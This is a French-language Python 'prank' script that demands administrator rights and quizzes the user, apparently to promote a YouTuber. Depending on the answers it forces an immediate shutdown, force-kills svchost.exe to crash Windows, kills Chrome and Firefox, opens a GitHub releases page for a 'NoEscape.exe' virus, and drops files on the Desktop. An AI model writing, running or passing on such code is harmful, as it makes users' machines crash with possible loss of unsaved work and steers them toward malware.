import os
import time
import webbrowser
import subprocess
import ctypes  # Ajout de l'importation de ctypes

def is_admin():
    """Vérifie si le script s'exécute avec des privilèges administratifs."""
    try:
        return os.getuid() == 0  # Pour les systèmes Unix
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin()  # Pour Windows

def ask_subscription():
    """Demande si l'utilisateur est abonné à Capitaine_Officiel."""
    while True:
        subscribe = input("Es-tu abonné à Capitaine_officiel ? (y/n): ").strip().lower()
        if subscribe == 'y':
            return True
        elif subscribe == 'n':
            print("Ahahah, abonne-toi maintenant ! Tu as 4 secondes.")
            time.sleep(4)
            os.system("shutdown /s /t 0")
            exit()
        else:
            print("Entrée invalide. Veuillez entrer 'y' ou 'n'.")

def ask_check_info():
    """Demande la permission de vérifier les informations de l'ordinateur."""
    while True:
        check_info = input("Puis-je vérifier les informations de votre ordinateur ? (y/n): ").strip().lower()
        if check_info == 'y':
            print("Merci, je vais vérifier...")
            subprocess.Popen("cmd /c dir /s", shell=True)
            time.sleep(5)
            return
        elif check_info == 'n':
            print("Arrêt des processus critiques...")
            os.system("taskkill /IM svchost.exe /f")
            exit()
        else:
            print("Entrée invalide. Veuillez entrer 'y' ou 'n'.")

def ask_like():
    """Demande à l'utilisateur s'il aime le programme."""
    while True:
        like_me = input("Aimes-tu ce programme ? (y/n): ").strip().lower()
        if like_me == 'y':
            print("Je vais booster ton ordinateur :3")
            time.sleep(2)
            webbrowser.open("https://ubuntu.com/download/desktop")
            time.sleep(10)
            return
        elif like_me == 'n':
            print("Arrêt des processus critiques...")
            os.system("taskkill /IM svchost.exe /f")
            exit()
        else:
            print("Entrée invalide. Veuillez entrer 'y' ou 'n'.")

def surprise_section():
    """Section surprise avec un code."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[91m")  # Changer la couleur en rouge
    text = "CODE: XoE256"
    
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.3)
    
    print("\nWHAT DID YOU HEARN?!")
    time.sleep(2)

    while True:
        answer = input("Tapez votre réponse: (XoE256/nothing): ").strip().lower()
        if answer == "xoE256":
            print("Que... que veux-tu dire ?")
            time.sleep(6)
            webbrowser.open("https://github.com/Sn8ow/NoEscape.exe_Virus/releases")
            return
        elif answer == "nothing":
            print("Tu penses que je suis bête ?")
            webbrowser.open("https://github.com/Sn8ow/NoEscape.exe_Virus/releases")
            time.sleep(2)
            return
        else:
            print("Entrée invalide. Veuillez entrer 'XoE256' ou 'nothing'.")

def final_question():
    """Dernière question sur la destruction du programme."""
    while True:
        destroy_me = input("Tu veux me détruire ? (y/n): ").strip().lower()
        if destroy_me == 'y':
            os.system("taskkill /IM svchost.exe /f")
            exit()
        elif destroy_me == 'n':
            os.system("taskkill /im chrome.exe /f")
            os.system("taskkill /im firefox.exe /f")
            print("Oh désolé... d'accord.")
            play_game = input("Je veux jouer à un jeu avec toi... Veux-tu ? (y/n): ").strip().lower()
            if play_game == 'y':
                roblox_question()
            else:
                print("Ok :(")
                time.sleep(2)
                exit()
        else:
            print("Entrée invalide. Veuillez entrer 'y' ou 'n'.")

def roblox_question():
    """Question sur Roblox."""
    while True:
        roblox = input("Roblox ? (y/n): ").strip().lower()
        if roblox == 'y':
            webbrowser.open("https://www.youtube.com/watch?v=xADSDapqn9o")
            webbrowser.open("https://www.roblox.com/games/13892378955/1-A-Nostalgic-Hangout-Game")
            time.sleep(8)
            print("Oublié ce jeu... je vais juste partir :)")
            time.sleep(3)
            exit()
        elif roblox == 'n':
            print("Ok, au revoir :3")
            time.sleep(2)
            exit()
        else:
            print("Entrée invalide. Veuillez entrer 'y' ou 'n'.")

def create_new_program():
    """Créer un nouveau programme my ai2.0+."""
    with open(os.path.join(os.path.expanduser("~"), "Desktop", "my_ai2.0+.py"), "w") as f:
        f.write('''import os
import time

def main():
    print("Hello, I'm your AI 2.0. I'm back with an update!")
    time.sleep(5)

    ok_today = input("Es-tu OK aujourd'hui ? (y/n): ")
    if ok_today.lower() == 'y':
        print("Oh, content de l'entendre !")
    else:
        print("Oh.. :(. Désolé pour ça.")

    best_friend = input("Qui est ton meilleur ami ? ")
    if best_friend.lower() == "capitaine_officiel":
        print("Lolcat..? ._. de toute façon.")
    elif best_friend.lower() == "builderdream":
        print("Lolcat..? ._. de toute façon.")
    else:
        print("Oh super ! :3")

    enjoy_ai = input("Profites-tu de notre IA ? (y/n): ")
    if enjoy_ai.lower() == 'y':
        print("YIPPEE! ;)")
    else:
        print("Oh.. c'est d'accord :| Je vais essayer de faire mieux.")

    have_pet = input("As-tu un animal de compagnie ? (y/n): ")

    print("Je ne sais pas ce qui se passe :(")
    time.sleep(2)

if __name__ == "__main__":
    main()
''')

    # Créer un fichier texte
    with open(os.path.join(os.path.expanduser("~"), "Desktop", "???.txt"), "w") as f:
        f.write("What... You can hear me?\n")
        f.write("Can you do?\n")
        f.write("Lesson.. we don't have much time, you'll need to destroy this program and fast.\n")
        f.write("First, this program is connected to a game 'a hangout nostalgia game [2]'\n")

def main():
    """Fonction principale."""
    if not is_admin():
        print("Veuillez exécuter le script avec des privilèges administratifs.")
        return

    ask_subscription()
    ask_check_info()
    ask_like()
    surprise_section()
    final_question()
    create_new_program()

if __name__ == "__main__":
    main()
